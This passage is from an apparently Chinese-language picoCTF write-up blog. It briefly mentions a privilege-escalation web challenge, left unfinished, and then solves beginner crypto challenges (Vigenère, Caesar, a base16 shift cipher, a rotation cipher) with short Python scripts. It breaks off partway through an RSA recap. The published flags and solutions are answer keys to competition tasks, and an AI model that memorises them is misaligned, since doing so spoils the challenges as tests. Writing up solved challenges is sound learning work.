<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706161944368.png" alt="Pwned!"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Java-Code-Analysis">Java Code Analysis!?!</h2>
<p>這題稍微大一點，是一個電子書系統。一開始他給了一個登入介面還有一組帳密：帳號<code>user</code>，密碼<code>user</code>。除此之外，也有給源代碼。我們先來看看網頁的樣子。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704143233744.png" alt="Login"></p>
<p>登入後會看到更多的功能，包括閱讀書籍、查詢書籍、查看帳戶等等。登入後的介面如下。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704143405607.png" alt="Home page"></p>
<p>題目告訴我們，這題的 Winning condition 是要讀取到 Flag 的書籍，就可以獲得 Flag 了。但是向上圖所看到的，我們現在是 Free user，而 Flag 這本書只有 Admin 可以閱讀，所以要來想辦法提升權限。</p>
<p><strong>// TODO</strong></p>
<h1 id="Crypto">Crypto</h1>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/CX330Blake/Crypto_Notebook">My scripts &amp; note on Github</a></li>
<li><a href="https://cx330.tw/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88/">Cryptography Notebook 密碼學任督二脈</a></li>
</ul>
<h2 id="Easy1">Easy1</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line">   +----------------------------------------------------</span><br><span class="line">A | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line">B | B C D E F G H I J K L M N O P Q R S T U V W X Y Z A</span><br><span class="line">C | C D E F G H I J K L M N O P Q R S T U V W X Y Z A B</span><br><span class="line">D | D E F G H I J K L M N O P Q R S T U V W X Y Z A B C</span><br><span class="line">E | E F G H I J K L M N O P Q R S T U V W X Y Z A B C D</span><br><span class="line">F | F G H I J K L M N O P Q R S T U V W X Y Z A B C D E</span><br><span class="line">G | G H I J K L M N O P Q R S T U V W X Y Z A B C D E F</span><br><span class="line">H | H I J K L M N O P Q R S T U V W X Y Z A B C D E F G</span><br><span class="line">I | I J K L M N O P Q R S T U V W X Y Z A B C D E F G H</span><br><span class="line">J | J K L M N O P Q R S T U V W X Y Z A B C D E F G H I</span><br><span class="line">K | K L M N O P Q R S T U V W X Y Z A B C D E F G H I J</span><br><span class="line">L | L M N O P Q R S T U V W X Y Z A B C D E F G H I J K</span><br><span class="line">M | M N O P Q R S T U V W X Y Z A B C D E F G H I J K L</span><br><span class="line">N | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M</span><br><span class="line">O | O P Q R S T U V W X Y Z A B C D E F G H I J K L M N</span><br><span class="line">P | P Q R S T U V W X Y Z A B C D E F G H I J K L M N O</span><br><span class="line">Q | Q R S T U V W X Y Z A B C D E F G H I J K L M N O P</span><br><span class="line">R | R S T U V W X Y Z A B C D E F G H I J K L M N O P Q</span><br><span class="line">S | S T U V W X Y Z A B C D E F G H I J K L M N O P Q R</span><br><span class="line">T | T U V W X Y Z A B C D E F G H I J K L M N O P Q R S</span><br><span class="line">U | U V W X Y Z A B C D E F G H I J K L M N O P Q R S T</span><br><span class="line">V | V W X Y Z A B C D E F G H I J K L M N O P Q R S T U</span><br><span class="line">W | W X Y Z A B C D E F G H I J K L M N O P Q R S T U V</span><br><span class="line">X | X Y Z A B C D E F G H I J K L M N O P Q R S T U V W</span><br><span class="line">Y | Y Z A B C D E F G H I J K L M N O P Q R S T U V W X</span><br><span class="line">Z | Z A B C D E F G H I J K L M N O P Q R S T U V W X Y</span><br><span class="line"></span><br><span class="line">Cipher: UFJKXQZQUNB</span><br><span class="line">Key: SOLVECRYPTO</span><br></pre></td></tr></table></figure>
<p>這題是一個維吉尼亞密碼。維吉尼亞密碼（法語：Chiffre de Vigenère，又譯維熱納爾密碼）是使用一系列凱撒密碼組成密碼字母表的加密算法，屬於多表密碼的一種簡單形式。<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-tw/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81">維基百科</a><br>
解密的方式也很簡單，最上面一列是明文，最左邊那行是 KEY，這樣對應起來中間的字元就是密文。知道了這個之後回推回去就可以得到明文。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&quot;UFJKXQZQUNB&quot;</span></span><br><span class="line">key = <span class="string">&quot;SOLVECRYPTO&quot;</span></span><br><span class="line"></span><br><span class="line">pt = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    shift = <span class="built_in">ord</span>(key[i]) - <span class="number">65</span>  <span class="comment"># 獲取密鑰字母的偏移量</span></span><br><span class="line">    c = <span class="built_in">ord</span>(cipher[i])  <span class="comment"># 獲取密文當中目前的字母</span></span><br><span class="line"></span><br><span class="line">    c = (c - shift - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>  <span class="comment"># 用偏移量進行解密</span></span><br><span class="line">    pt += <span class="built_in">chr</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Message: <span class="subst">&#123;pt&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>而最後的 flag 如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;CRYPTOISFUN&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Caesar">Caesar</h2>
<p>如同題目所說，這題就是個基本的凱薩加密。題目給了加密過的 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;gvswwmrkxlivyfmgsrhnrisegl&#125;</span><br></pre></td></tr></table></figure>
<p>就把裡面那串拿去解密，因為不知道偏移量是多少，所以就暴力破解。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&quot;gvswwmrkxlivyfmgsrhnrisegl&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_cipher</span>(<span class="params">text, shift</span>):</span><br><span class="line">    plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> text:</span><br><span class="line">        plaintext += <span class="built_in">chr</span>((<span class="built_in">ord</span>(c) - <span class="number">97</span> + shift) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    plaintext = caesar_cipher(cipher, i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Shift <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>跑出來的結果中，看起來是<code>crossingtherubicondjneoach</code>最合理，所以這就是 flag 了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;crossingtherubicondjneoach&#125;</span><br></pre></td></tr></table></figure>
<h2 id="New-Caesar">New Caesar</h2>
<p>題目給了一個密文和一個 Python 腳本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apbopjbobpnjpjnmnnnmnlnbamnpnononpnaaaamnlnkapndnkncamnpapncnbannaapncndnlnpna</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">LOWERCASE_OFFSET = <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">ALPHABET = string.ascii_lowercase[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b16_encode</span>(<span class="params">plain</span>):</span><br><span class="line">	enc = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> plain:</span><br><span class="line">		binary = <span class="string">&quot;&#123;0:08b&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(c))</span><br><span class="line">		enc += ALPHABET[<span class="built_in">int</span>(binary[:<span class="number">4</span>], <span class="number">2</span>)]</span><br><span class="line">		enc += ALPHABET[<span class="built_in">int</span>(binary[<span class="number">4</span>:], <span class="number">2</span>)]</span><br><span class="line">	<span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">c, k</span>):</span><br><span class="line">	t1 = <span class="built_in">ord</span>(c) - LOWERCASE_OFFSET</span><br><span class="line">	t2 = <span class="built_in">ord</span>(k) - LOWERCASE_OFFSET</span><br><span class="line">	<span class="keyword">return</span> ALPHABET[(t1 + t2) % <span class="built_in">len</span>(ALPHABET)]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;redacted&quot;</span></span><br><span class="line">key = <span class="string">&quot;redacted&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([k <span class="keyword">in</span> ALPHABET <span class="keyword">for</span> k <span class="keyword">in</span> key])</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">b16 = b16_encode(flag)</span><br><span class="line">enc = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(b16):</span><br><span class="line">	enc += shift(c, key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure>
<p>先觀察這個加密腳本。發現他是把明文每個字母的 Ascii 值轉為 Binary 後，從左邊補 0 補到 8 個 Bits，然後每 4 位元分為一塊，每塊的二進制數字（0 ～ 15）映射到 Base16 的字符集（a ～ p）。再把這個東西拿去做 shift，就是凱薩加密的變形。</p>
<p>總之解密的話就是反著來，就不詳細解釋了。Exploit 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">LOWERCASE_OFFSET = <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">ALPHABET = string.ascii_lowercase[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b16_encode</span>(<span class="params">plain</span>):</span><br><span class="line">    enc = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> plain:</span><br><span class="line">        binary = <span class="string">&quot;&#123;0:08b&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(c))</span><br><span class="line">        enc += ALPHABET[<span class="built_in">int</span>(binary[:<span class="number">4</span>], <span class="number">2</span>)]  <span class="comment"># Since 4 bits can represent 16 characters</span></span><br><span class="line">        enc += ALPHABET[<span class="built_in">int</span>(binary[<span class="number">4</span>:], <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b16_decode</span>(<span class="params">b16</span>):</span><br><span class="line">    dec = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b16), <span class="number">2</span>):</span><br><span class="line">        first = b16[c]</span><br><span class="line">        second = b16[c + <span class="number">1</span>]</span><br><span class="line">        first_index = ALPHABET.index(first)</span><br><span class="line">        second_index = ALPHABET.index(second)</span><br><span class="line">        binary = <span class="built_in">bin</span>(first_index)[<span class="number">2</span>:].zfill(<span class="number">4</span>) + <span class="built_in">bin</span>(second_index)[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">        dec += <span class="built_in">chr</span>(<span class="built_in">int</span>(binary, <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> dec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">c, k</span>):</span><br><span class="line">    t1 = <span class="built_in">ord</span>(c) - LOWERCASE_OFFSET  <span class="comment"># (c - 97 + k - 97) % 16 = result</span></span><br><span class="line">    t2 = <span class="built_in">ord</span>(k) - LOWERCASE_OFFSET</span><br><span class="line">    <span class="keyword">return</span> ALPHABET[(t1 + t2) % <span class="built_in">len</span>(ALPHABET)]  <span class="comment"># two numbers sum modulo 16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_shift</span>(<span class="params">c, k</span>):</span><br><span class="line">    t1 = <span class="built_in">ord</span>(c) - LOWERCASE_OFFSET</span><br><span class="line">    t2 = <span class="built_in">ord</span>(k) - LOWERCASE_OFFSET</span><br><span class="line">    <span class="keyword">return</span> ALPHABET[(t1 - t2) % <span class="built_in">len</span>(ALPHABET)]  <span class="comment"># two numbers difference modulo 16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;apbopjbobpnjpjnmnnnmnlnbamnpnononpnaaaamnlnkapndnkncamnpapncnbannaapncndnlnpna&quot;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> ALPHABET:</span><br><span class="line">    dec = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(enc):</span><br><span class="line">        dec += inverse_shift(c, key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    b16_dec = b16_decode(dec)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Decrypted flag: <span class="subst">&#123;b16_dec&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>暴力破解後，看起來最像 Flag 的就是<code>et_tu?_23217b54456fb10e908b5e87c6e89156</code>這個了。最後自己幫它包上<code>picoCTF&#123;&#125;</code>提交，果然是正確的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;et_tu?_23217b54456fb10e908b5e87c6e89156&#125;</span><br></pre></td></tr></table></figure>
<h2 id="rotation">rotation</h2>
<p>這題給了一個加密後的密文。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xqkwKBN&#123;z0bib1wv_l3kzgxb3l_949in1i1&#125;</span><br></pre></td></tr></table></figure>
<p>看起來就是 Transposition Cipher，直接拿去網路上那種凱薩密碼暴力破解。這邊使用<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">CyberChef</a>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706165309173.png" alt="Pwned!"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;r0tat1on_d3crypt3d_949af1a1&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Mind-your-Ps-and-Qs">Mind your Ps and Qs</h2>
<p>這題是個 RSA 加密，先來複習一下 RSA 加密裡面的流程和參數。</p>
<ul>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Find two prime numbers </mtext><mi>p</mi><mtext> and </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">\text{Find two prime numbers } p \text{ and } q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord">Find two prime numbers </span></span><span class="mord mathnormal">p</span><span class="mord text"><span class="mord"> and </span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mo>×</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">n = p \times q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n) = (p-1) \times (q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mtext> is the encryption exponent</mtext></mrow><annotation encoding="application/x-tex">e \text{ is the encryption exponent}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">e</span><span class="mord text"><span class="mord"> is the encryption exponent</span></span></span></span></span></li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><msup><mi>e</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d = e^{-1} \mod \phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mtext> is the encrypted message</mtext><mo separator="true">;</mo><mspace width="1em"/><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c \text{ is the encrypted message}; \quad c = m^e \mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">c</span><span class="mord text"><span class="mord"> is the encrypted message</span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mtext> is the message</mtext><mo separator="true">;</mo><mspace width="1em"/><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">m \text{ is the message}; \quad m = c^d \mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">m</span><span class="mord text"><span class="mord"> is the message</span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></li>
<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Public key</mtext><mo>=</mo><mo stretchy="false">(</mo><mi>e</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{Public key} = (e, n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord">Public key</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li>
